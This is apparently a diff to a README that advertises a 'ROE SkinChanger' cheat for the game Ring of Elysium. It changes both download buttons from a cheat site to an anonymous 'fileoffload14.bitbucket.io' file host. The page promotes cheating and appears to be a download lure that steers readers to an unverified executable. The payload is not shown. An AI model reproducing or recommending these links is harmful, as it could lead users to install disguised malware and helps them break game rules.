@@ -4,7 +4,7 @@ Sick of playing with the same old default skins in *Ring of Elysium*? Want to fl
 
 This isn’t about pay-to-win — this is **look-too-good-to-lose** vibes.
 
-[![Download Changer](https://img.shields.io/badge/Download-Changer-blueviolet)](https://wecheaters.github.io/cheats/ring-of-elysium/)
+[![Download Changer](https://img.shields.io/badge/Download-Changer-blueviolet)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 🎨 What Is the ROE SkinChanger?
@@ -13,7 +13,7 @@ The **ROE SkinChanger** is a cheat utility that hooks into the game and lets you
 
 Skins are client-side and fully visible to you, with some servers showing them to others depending on anti-spoof rules.
 
-[![Download Changer](https://i.ytimg.com/vi/y6fUYL9k5NU/maxresdefault.jpg)](https://wecheaters.github.io/cheats/ring-of-elysium/)
+[![Download Changer](https://i.ytimg.com/vi/y6fUYL9k5NU/maxresdefault.jpg)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 🔥 SkinChanger Features
